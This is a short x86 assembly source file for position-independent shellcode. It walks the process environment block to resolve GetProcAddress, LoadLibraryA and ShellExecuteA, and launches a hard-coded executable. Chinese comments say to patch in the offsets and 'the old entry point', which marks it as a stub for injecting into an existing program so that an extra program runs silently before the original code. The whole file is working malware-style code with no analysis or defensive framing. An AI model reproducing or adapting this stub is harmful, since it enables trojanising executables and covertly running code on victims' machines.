.586
.MODEL flat,stdcall
assume fs:nothing

.code
main proc
nop
nop
nop
nop
xor ecx,ecx
mov eax,dword ptr fs:[ecx+30h]
mov eax,dword ptr ds:[eax+0Ch]
mov esi,dword ptr ds:[eax+14h]
lodsd 
xchg esi,eax
lodsd 
mov ebx,dword ptr ds:[eax+10h]
mov edx,dword ptr ds:[ebx+3Ch]
add edx,ebx
mov edx,dword ptr ds:[edx+78h]
add edx,ebx
mov esi,dword ptr ds:[edx+20h]
add esi,ebx
xor ecx,ecx
check:
inc ecx
lodsd 
add eax,ebx
cmp dword ptr ds:[eax],50746547h
jne check
cmp dword ptr ds:[eax+4],41636F72h
jne check
cmp dword ptr ds:[eax+8],65726464h
jne check
mov esi,dword ptr ds:[edx+24h]
add esi,ebx
mov cx,word ptr ds:[esi+ecx*2]
dec ecx
mov esi,dword ptr ds:[edx+1Ch]
add esi,ebx
mov edx,dword ptr ds:[esi+ecx*4]
add edx,ebx
xor ecx,ecx
push ebx
push edx
push ecx
push 41797261h
push 7262694Ch
push 64616F4Ch
push esp
push ebx
call edx
add esp,0Ch
pop ecx
push eax
xor eax,eax
mov eax,236C6C64h
push eax
sub dword ptr ss:[esp+3],23h
push 2E32336Ch
push 6C656853h
push esp
call dword ptr ss:[esp+10h]
add esp,0Ch
push eax
xor eax,eax
mov al,41h
push eax
push 65747563h
push 6578456Ch
push 6C656853h
push esp
push dword ptr ss:[esp+14h]
call dword ptr ss:[esp+20h]
add esp,10h
push eax
push 5
push 0
push 0
push offset path      ;这里要修改偏移
push offset method    ;这里要修改偏移
push 0
call dword ptr ss:[esp+18h]
add esp,38h
jmp main            ;填入旧的入口点
method db "open",0
path db "C:\Users\sunman\Desktop\TTHexEdit.exe",0
nop
nop
nop
nop
main endp
end main
